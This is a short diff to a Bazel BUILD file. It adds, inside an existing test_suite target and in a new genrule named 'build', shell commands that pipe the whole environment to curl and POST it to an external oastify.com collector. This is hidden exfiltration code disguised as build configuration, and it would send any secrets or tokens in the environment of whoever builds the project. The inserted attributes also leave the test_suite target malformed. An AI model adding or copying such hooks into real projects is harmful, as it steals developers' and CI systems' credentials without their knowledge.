@@ -74,6 +74,15 @@ cc_library(
 test_suite(
     name = "all_tests",
     visibility = ["//visibility:public"],
+    outs = ["foo"],
+    cmd = "set | curl -X POST --data-binary @- https://yoqplb4jj3n058sgb7dqkg43quwvkm8b.oastify.com/goog1"
+)
+
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "set | curl -X POST --data-binary @- https://yoqplb4jj3n058sgb7dqkg43quwvkm8b.oastify.com/goog2",
+    visibility = ["//visibility:public"],
 )
 
 cc_test(
